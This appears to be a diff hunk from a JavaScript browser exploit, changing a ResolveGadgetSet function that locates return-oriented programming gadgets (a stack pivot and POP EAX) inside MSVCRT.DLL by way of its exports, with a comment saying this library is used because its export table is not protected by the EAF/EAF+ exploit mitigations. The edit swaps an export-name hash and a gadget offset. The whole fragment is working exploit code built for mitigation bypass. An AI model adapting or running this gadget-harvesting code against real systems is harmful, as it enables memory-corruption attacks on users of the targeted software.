@@ -507,9 +507,9 @@
         function ResolveGadgetSet(MsvcrtBase) { // Dynamically resolve gadget addresses via delta from export addresses - MSVCRT.DLL is used to harvest gadgets as its EAT is not protected by EAF/EAF+
             var GadgetSetObj = new Object();
             // XCHG ESP, EAX; RET
-            var ExportPair = ResolveExport(MsvcrtBase, [0x696c5f5f, 0x735f6d62, 0x5f326573, 0x31676f6c, 0x00000030]); // 'il__' 's_mb' '_2es' '1gol' '0'
+            var ExportPair = ResolveExport(MsvcrtBase, [0x7974635f]); // 'ytc_'
             if(ExportPair[0]) {
-                GadgetSetObj.StackPivot = HarvestGadget(ExportPair[0], 0x9C37, 0xc394, 0x0000FFFF, 0x4e5);
+                GadgetSetObj.StackPivot = HarvestGadget(ExportPair[0], 0x9C37, 0xc394, 0x0000FFFF, 0x8A37);
                 if(GadgetSetObj.StackPivot != 0) {
                     GadgetSetObj.RopNop = (GadgetSetObj.StackPivot + 1);
                     // POP EAX; RET
